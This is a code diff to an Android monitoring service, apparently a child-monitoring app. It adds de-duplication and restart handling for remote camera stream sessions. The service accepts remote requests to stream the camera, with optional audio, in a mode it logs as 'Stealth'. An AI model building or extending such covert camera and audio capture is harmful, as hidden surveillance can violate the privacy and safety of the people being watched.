@@ -215,10 +215,21 @@ class ChildMonitoringService : Service() {
         socket.onCameraStreamRequest = { sessionId, _, cameraFacing, withAudio ->
             Log.i(TAG, "Camera stream requested for session $sessionId (Stealth)")
             socket.acceptCameraStream(sessionId)
-            CameraStreamService.start(this, token, sessionId, cameraFacing, withAudio)
+
+            val isSameSession = CameraStreamService.isSessionRunning.get() && CameraStreamService.currentSessionId == sessionId
+            if (isSameSession) {
+                Log.i(TAG, "Camera streaming session $sessionId is already active, skipping duplicate start")
+            } else {
+                if (CameraStreamService.isSessionRunning.get()) {
+                    Log.i(TAG, "New camera stream request received while old session was active. Stopping old session first.")
+                    CameraStreamService.stop(this)
+                }
+                CameraStreamService.start(this, token, sessionId, cameraFacing, withAudio)
+            }
         }
 
         socket.onCameraStreamStopped = { sessionId ->
+            Log.i(TAG, "Camera stream stopped for session $sessionId")
             CameraStreamService.stop(this)
         }
 
